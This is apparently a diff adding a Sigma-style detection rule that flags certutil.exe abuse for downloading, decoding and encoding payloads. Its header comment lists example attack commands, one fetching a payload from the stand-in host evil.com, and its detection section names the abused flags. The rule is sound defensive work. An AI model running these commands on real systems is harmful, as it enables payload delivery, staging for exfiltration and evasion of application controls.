@@ -1,0 +1,91 @@
+# =============================================================================
+# AEGIS Detection Rule: LOLBin - Certutil.exe Abuse
+# =============================================================================
+# certutil.exe is a legitimate Windows command-line utility for managing
+# certificates and certificate authorities. Adversaries abuse its file
+# download (-urlcache), encoding (-encode/-decode), and decoding (-decodehex)
+# capabilities to download payloads, decode staged files, and bypass
+# application controls.
+#
+# Common abuse patterns:
+#   1. certutil -urlcache -split -f http://evil.com/payload.exe out.exe
+#   2. certutil -decode encoded_payload.txt decoded_payload.exe
+#   3. certutil -decodehex hex_payload.txt decoded_payload.exe
+#   4. certutil -encode payload.exe encoded_payload.txt (for exfiltration)
+#
+# Data Requirements:
+#   - Sysmon Event ID 1 (Process Creation) with CommandLine logging
+#   - Alternatively: Windows Security Event ID 4688 with command line auditing
+# =============================================================================
+
+title: Certutil.exe Abuse for File Download or Decode - LOLBin
+id: b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d6e
+status: stable
+description: |
+    Detects abuse of certutil.exe for file download, encoding, and decoding
+    operations. Certutil is a signed Microsoft binary commonly abused as a
+    Living-off-the-Land Binary (LOLBin) to download payloads from remote
+    servers (-urlcache), decode base64-encoded staged payloads (-decode),
+    decode hex-encoded payloads (-decodehex), or encode files for
+    exfiltration (-encode).
+
+    These command-line patterns are rarely used in legitimate certificate
+    management and are strong indicators of adversary tooling.
+references:
+    - https://attack.mitre.org/techniques/T1105/
+    - https://attack.mitre.org/techniques/T1140/
+    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
+    - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
+    - https://www.sans.org/blog/certutil-one-more-tool-for-your-red-team-arsenal/
+author: AEGIS Detection Engineering
+date: 2026-10-29
+modified: 2026-10-29
+tags:
+    - attack.execution
+    - attack.t1105
+    - attack.defense_evasion
+    - attack.t1140
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    # Primary selection: certutil.exe process creation
+    selection_certutil:
+        EventID: 1
+        Image|endswith: '\certutil.exe'
+
+    # Suspicious command-line flags indicating abuse
+    selection_download:
+        CommandLine|contains:
+            - '-urlcache'       # Download file from URL
+            - '/urlcache'       # Slash variant
+
+    selection_split:
+        CommandLine|contains:
+            - '-split'          # Split download (bypass caching)
+            - '/split'          # Slash variant
+
+    selection_decode:
+        CommandLine|contains:
+            - '-decode'         # Base64 decode
+            - '/decode'         # Slash variant
+            - '-decodehex'      # Hex decode
+            - '/decodehex'      # Slash variant
+
+    selection_encode:
+        CommandLine|contains:
+            - '-encode'         # Base64 encode (exfiltration staging)
+            - '/encode'         # Slash variant
+
+    condition: selection_certutil and (selection_download or selection_split or selection_decode or selection_encode)
+falsepositives:
+    - Legitimate certificate enrollment scripts that use certutil -urlcache to download CRL/OCSP data
+    - PKI administrators performing manual certificate operations
+    - Automated certificate management tools (e.g., ADCS enrollment agents)
+    - System Center Configuration Manager (SCCM) certificate deployment scripts
+level: high
+
+# AEGIS-specific metadata for test harness integration
+test_fixtures:
+    - tests/fixtures/execution/lolbin_certutil_download_true_positive.json
+    - tests/fixtures/execution/lolbin_certutil_download_false_positive.json
